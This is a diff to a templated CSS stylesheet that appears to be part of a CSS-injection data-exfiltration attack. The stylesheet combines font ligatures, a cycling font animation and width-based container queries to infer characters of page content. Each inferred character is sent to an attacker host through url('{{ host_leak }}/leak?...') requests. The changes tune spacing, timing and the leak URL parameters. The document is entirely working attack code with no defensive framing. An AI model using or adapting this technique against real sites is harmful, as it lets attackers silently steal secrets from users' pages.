@@ -71,6 +71,7 @@ body {
     width: fit-content !important;
     overflow: hidden !important;
     white-space: normal !important;
+    word-spacing: -1ch !important;
     letter-spacing: 0 !important;
     line-height: 3px !important;
     font-feature-settings: "rlig" on, "liga" on, "calt" on, "dlig" on !important;
@@ -80,7 +81,7 @@ body {
     background: skyblue !important;
     will-change: content, transform !important;
     position: relative !important;
-    animation: fontCycle {{ idx_max * 0.5 }}s steps(1) infinite 1s;
+    animation: fontCycle {{ idx_max }}s steps(1) infinite 1s;
 }
 
 @keyframes fontCycle {
@@ -94,7 +95,7 @@ body {
 {% for container in width_containers %}
 @container leak (width: {{ container.width }}px) {
     head::before {
-        content: var(--xd, var(--yo, url("{{ host_leak }}/leak?idx={{ container.char_idx }}&id={{ id }}")));
+        content: url("{{ host_leak }}/leak?step={{ container.step }}&idx={{ container.char_idx }}&id={{ id }}");
     }
 }
 {% endfor %}
